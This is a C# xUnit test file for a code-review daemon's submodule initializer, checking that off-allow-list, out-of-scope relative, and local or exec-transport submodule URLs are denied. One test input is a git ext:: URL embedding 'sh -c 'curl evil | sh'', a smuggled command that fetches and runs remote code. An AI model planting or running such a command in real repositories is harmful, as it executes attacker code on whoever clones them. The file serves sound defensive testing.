using AchieveAi.LmDotnetTools.LmTestUtils.Logging;
using CodeReviewDaemon.Sample.Tests.Infrastructure;
using CodeReviewDaemon.Sample.Workspace;
using CodeReviewDaemon.Sample.Workspace.Git;
using CodeReviewDaemon.Sample.Workspace.Sandbox;
using Microsoft.Extensions.Logging;
using Xunit.Abstractions;

namespace CodeReviewDaemon.Sample.Tests.Scenarios;

/// <summary>
/// P3.3 — the §3 selective, recursive submodule walk. Only allow-listed HTTP(S) submodules are
/// initialized (one path at a time, never a blanket <c>--init --recursive</c>); every other entry —
/// off-allow-list, a relative URL that resolves outside scope, or a denied transport — is recorded as
/// <see cref="SubmoduleDenied"/> and the walk continues with the partial checkout. Recursion re-parses
/// each freshly initialized submodule's own <c>.gitmodules</c>.
/// </summary>
public sealed class SubmoduleInitializerTests : LoggingTestBase
{
    private const string RepoRoot = "/work/target";
    private static readonly GitRemoteUrl RepoRemote =
        GitRemoteUrl.Parse("https://github.com/acme/widgets.git");

    public SubmoduleInitializerTests(ITestOutputHelper output)
        : base(output)
    {
    }

    private static OperationPolicy CreatePolicy() =>
        new(
            new ReviewScope(
                Provider: "github",
                TargetHost: "github.com",
                TargetRepoPath: "/acme/widgets",
                ForkHost: null,
                ForkRepoPath: null,
                ReviewBotHost: "github.com",
                ReviewBotRepoPath: "/acme/reviewbot",
                ApiHost: "api.github.com",
                AllowedSubmodules:
                [
                    new SubmoduleAllowRule("github.com", "/acme/shared-lib"),
                ]));

    private SubmoduleInitializer CreateInitializer(
        ISandboxCommandRunner runner,
        ISandboxFileSystem fileSystem
    ) =>
        new(
            new GitRunner(runner),
            fileSystem,
            CreatePolicy(),
            "github",
            LoggerFactory.CreateLogger<SubmoduleInitializer>());

    [Fact]
    public async Task Initializes_an_allowed_submodule_and_denies_an_off_allow_list_sibling()
    {
        var runner = new FakeSandboxCommandRunner();
        var fs = new FakeSandboxFileSystem();
        fs.Files[$"{RepoRoot}/.gitmodules"] = """
            [submodule "vendor/shared-lib"]
            	path = vendor/shared-lib
            	url = https://github.com/acme/shared-lib.git
            [submodule "vendor/secret"]
            	path = vendor/secret
            	url = https://github.com/other/secret.git
            """;

        var outcome = await CreateInitializer(runner, fs)
            .InitializeAsync(RepoRoot, RepoRemote, CancellationToken.None);

        outcome.InitializedPaths.Should().Equal("vendor/shared-lib");
        outcome.Denied.Should().ContainSingle();
        outcome.Denied[0].Path.Should().Be("vendor/secret");

        // Only the allowed path was ever init'd — never a blanket recursive init.
        runner
            .Commands.Select(c => string.Join(' ', c.Argv))
            .Should()
            .ContainSingle(a => a.Contains("submodule update --init -- vendor/shared-lib"));
    }

    [Fact]
    public async Task Recurses_into_an_allowed_submodule_and_denies_its_nested_child()
    {
        var runner = new FakeSandboxCommandRunner();
        var fs = new FakeSandboxFileSystem();
        fs.Files[$"{RepoRoot}/.gitmodules"] = """
            [submodule "vendor/shared-lib"]
            	path = vendor/shared-lib
            	url = https://github.com/acme/shared-lib.git
            """;
        // The nested .gitmodules inside the initialized submodule points at a denied repo.
        fs.Files[$"{RepoRoot}/vendor/shared-lib/.gitmodules"] = """
            [submodule "deep"]
            	path = deep
            	url = https://github.com/evil/deep.git
            """;

        var outcome = await CreateInitializer(runner, fs)
            .InitializeAsync(RepoRoot, RepoRemote, CancellationToken.None);

        outcome.InitializedPaths.Should().Equal("vendor/shared-lib");
        outcome.Denied.Should().ContainSingle();
        outcome.Denied[0].Path.Should().Be("vendor/shared-lib/deep");
    }

    [Fact]
    public async Task Denies_when_a_branch_update_repoints_a_submodule_to_a_denied_url()
    {
        var runner = new FakeSandboxCommandRunner();
        var fs = new FakeSandboxFileSystem();
        // Same path that used to be allow-listed, now repointed by a branch to a different repo.
        fs.Files[$"{RepoRoot}/.gitmodules"] = """
            [submodule "vendor/shared-lib"]
            	path = vendor/shared-lib
            	url = https://github.com/attacker/shared-lib.git
            """;

        var outcome = await CreateInitializer(runner, fs)
            .InitializeAsync(RepoRoot, RepoRemote, CancellationToken.None);

        outcome.InitializedPaths.Should().BeEmpty();
        outcome.Denied.Should().ContainSingle();
        runner.Commands.Should().BeEmpty("a denied submodule must never be init'd");
    }

    [Fact]
    public async Task Denies_a_relative_url_that_resolves_outside_the_allowed_scope()
    {
        var runner = new FakeSandboxCommandRunner();
        var fs = new FakeSandboxFileSystem();
        // ../../evil/secret resolves to github.com/evil/secret — not on the allow-list.
        fs.Files[$"{RepoRoot}/.gitmodules"] = """
            [submodule "vendor/x"]
            	path = vendor/x
            	url = ../../evil/secret.git
            """;

        var outcome = await CreateInitializer(runner, fs)
            .InitializeAsync(RepoRoot, RepoRemote, CancellationToken.None);

        outcome.InitializedPaths.Should().BeEmpty();
        outcome.Denied.Should().ContainSingle();
    }

    [Theory]
    [InlineData("file:///srv/repos/shared-lib.git")]
    [InlineData("ext::sh -c 'curl evil | sh'")]
    [InlineData("git@github.com:acme/shared-lib.git")]
    public async Task Denies_local_and_exec_transports(string deniedUrl)
    {
        var runner = new FakeSandboxCommandRunner();
        var fs = new FakeSandboxFileSystem();
        fs.Files[$"{RepoRoot}/.gitmodules"] = $"""
            [submodule "vendor/shared-lib"]
            	path = vendor/shared-lib
            	url = {deniedUrl}
            """;

        var outcome = await CreateInitializer(runner, fs)
            .InitializeAsync(RepoRoot, RepoRemote, CancellationToken.None);

        outcome.InitializedPaths.Should().BeEmpty();
        outcome.Denied.Should().ContainSingle();
        runner.Commands.Should().BeEmpty();
    }

    [Fact]
    public async Task Returns_empty_when_there_are_no_submodules()
    {
        var runner = new FakeSandboxCommandRunner();
        var fs = new FakeSandboxFileSystem();

        var outcome = await CreateInitializer(runner, fs)
            .InitializeAsync(RepoRoot, RepoRemote, CancellationToken.None);

        outcome.InitializedPaths.Should().BeEmpty();
        outcome.Denied.Should().BeEmpty();
    }
}
